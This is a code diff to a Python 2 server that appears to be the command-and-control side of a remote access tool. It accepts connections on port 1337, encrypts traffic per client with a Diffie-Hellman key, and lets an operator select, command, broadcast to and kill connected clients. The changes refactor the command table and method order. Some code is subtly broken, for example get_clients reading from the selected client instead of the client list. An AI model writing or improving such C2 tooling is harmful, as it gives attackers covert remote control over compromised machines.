@@ -51,6 +51,7 @@ import select
 import struct
 import logging
 import requests
+import tempfile
 import threading
 import subprocess
 import socketserver
@@ -83,25 +84,23 @@ Server Commands
 
 class Server(threading.Thread):
     global exit_status
-    global __command__
-    __command__ = {}
     def __init__(self, host='0.0.0.0', port=1337):
         super(Server, self).__init__()
         self.count          = 0
         self.lock           = threading.Event()
         self.current_client = None
         self.clients        = {}
-        self.commands       = {cmd: getattr(self, cmd) for cmd in __command__}
-        self.commands.update({
+        self.commands       = {
 	    'back'	    :   self.deselect_client,
             'client'        :   self.select_client,
             'clients'       :   self.list_clients,
             'quit'          :   self.quit_server,
 	    'sendall'	    :   self.sendall_clients,
             'usage'         :   self.usage,
-            'server'        :   self.usage,
-            '--help'        :   self.usage
-            })
+            '--help'        :   self.usage,
+            '-h'            :   self.usage,
+            '?'             :   self.usage
+            }
         self.manager        = threading.Thread(target=self.client_manager, name='client_manager')
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -131,7 +130,7 @@ class Server(threading.Thread):
 
     @property
     def __encryption(self):
-        return {'endian': '<' if sys.byteorder == 'little' else '!', 'rounds': 32, 'key_size': 16, 'block_size': 8}
+        return {'endian': '!', 'rounds': 32, 'key_size': 16, 'block_size': 8}
 
     def _encryption(self, block, dhkey):
         v0, v1  = struct.unpack(self.encryption['endian'] + "2L", block)
@@ -195,12 +194,7 @@ class Server(threading.Thread):
             except Exception as e:
                 print str(e)
         return ''.join(result).rstrip('\x00')
-
-    def command(fx, cx=__command__):
-        cx.update({fx.func_name: fx})
-        return fx
     
-    @command
     def encrypt(self, data, client_id):
         if int(client_id) not in self.clients:
             print "Invalid Client ID: '{}'".format(client_id)
@@ -208,37 +202,13 @@ class Server(threading.Thread):
             key = self.clients[int(client_id)]._dhkey
             return self._encrypt(data, key)
 
-    @command
     def decrypt(self, data, client_id):
         if int(client_id) not in self.clients:
             print "Invalid Client ID: '{}'".format(client_id)
         else:
             key = self.clients[int(client_id)]._dhkey
             return self._decrypt(data, key)
-    
-    @command    
-    def select_client(self, client_id):
-        if self.lock.is_set():
-            self.lock.clear()
-        if self.current_client and self.current_client.lock.is_set():
-            self.current_client.lock.clear()
-        if int(client_id) not in self.clients:
-            print '\nInvalid Client ID\n'
-        else:
-            self.current_client = self.clients[int(client_id)]
-            print '\nClient {} selected\n'.format(client_id)
-            self.current_client.lock.set()
-            return self.current_client.run()
-    
-    @command  
-    def deselect_client(self):
-        if self.current_client and self.current_client.lock.is_set():
-            self.current_client.lock.clear()
-        self.current_client = None
-        self.lock.set()
-        return self.run()
-    
-    @command  
+      
     def send_client(self, msg, client_id):
         if int(client_id) not in self.clients:
             print "Invalid Client ID: '{}'".format(client_id)
@@ -247,7 +217,6 @@ class Server(threading.Thread):
             data = self.encrypt(msg, client.name) + '\n'
             client.conn.sendall(data)
     
-    @command  
     def recv_client(self, client_id):
         if int(client_id) not in self.clients:
             print "Invalid Client ID: '{}'".format(client_id)
@@ -262,38 +231,45 @@ class Server(threading.Thread):
                     message = server.decrypt(message, client.name)
             return method, message
 
-    @command  
+    def get_clients(self):
+        return [v for _, v in self.current_client.items()]
+
+      
+    def deselect_client(self):
+        if self.current_client and self.current_client.lock.is_set():
+            self.current_client.lock.clear()
+        self.current_client = None
+        self.lock.set()
+        return self.run()
+
+      
     def sendall_clients(self, msg):
         for client in self.get_clients():
             self.send_client(msg, client.name)
 
-    @command  
+      
     def remove_client(self, key):
         return self.clients.pop(int(key), None)
     
-    @command  
+      
     def kill_client(self, client_id):
         client = self.clients.get(int(client_id))
         self.send_client('kill', client.name)
         client.conn.close()
         self.remove_client(client.name)
     
-    @command  
-    def get_clients(self):
-        return [v for _, v in self.current_client.items()]
-    
-    @command  
+      
     def list_clients(self):
         print '\nID | Client Address\n-------------------'
         for k, v in self.clients.items():
             print '{:>2} | {}'.format(k, v.addr[0])
         print '\n'
 
-    @command
+    
     def usage(self):
         print HELP_CMDS
     
-    @command  
+      
     def quit_server(self):
         q = raw_input('Exit the server and keep all clients alive (y/N)? ')
         if q.lower().startswith('y'):
@@ -305,6 +281,20 @@ class Server(threading.Thread):
             finally:
                 sys.exit(0)
 
+        
+    def select_client(self, client_id):
+        if self.lock.is_set():
+            self.lock.clear()
+        if self.current_client and self.current_client.lock.is_set():
+            self.current_client.lock.clear()
+        if int(client_id) not in self.clients:
+            print '\nInvalid Client ID\n'
+        else:
+            self.current_client = self.clients[int(client_id)]
+            print '\nClient {} selected\n'.format(client_id)
+            self.current_client.lock.set()
+            return self.current_client.run()
+
     def client_manager(self):
         while True:
             conn, addr  = self.s.accept()
@@ -314,8 +304,7 @@ class Server(threading.Thread):
             client.start()
             if exit_status:
                 break
-    
-    @command  
+
     def run(self):
         while True:
             if not self.manager.is_alive():
@@ -351,6 +340,7 @@ class Server(threading.Thread):
 class ConnectionHandler(threading.Thread):
     global server
     global exit_status
+    global debug
 
     def __init__(self, conn, addr, name):
         super(ConnectionHandler, self).__init__()
@@ -358,15 +348,15 @@ class ConnectionHandler(threading.Thread):
         self.addr   = addr
         self.name   = name
         self.info   = {}
-        self._dhkey = server.diffiehellman(conn)
         self.lock   = threading.Event()
-                
+        self._dhkey = server.diffiehellman(conn)
+
     def run(self, prompt=None):
         while True:
             if exit_status:
                 break
-            self.lock.wait()
             method, data = ('prompt', prompt) if prompt else server.recv_client(self.name)
+            self.lock.wait()
             if 'prompt' in method:
                 command = raw_input(data % int(self.name))
                 cmd, _, action = command.partition(' ')
@@ -380,12 +370,12 @@ class ConnectionHandler(threading.Thread):
             else:
                 if data:
                     print data
-            
+         
 
 if __name__ == '__main__':
     print BANNER
     p = 1337
-    logging.basicConfig(format='%(asctime)s %(name)-20s %(submodule)-15s %(message)s')
+    debug = True
     server  = Server(port=p)
     print "Server running on port {}...".format(p)
     server.start()
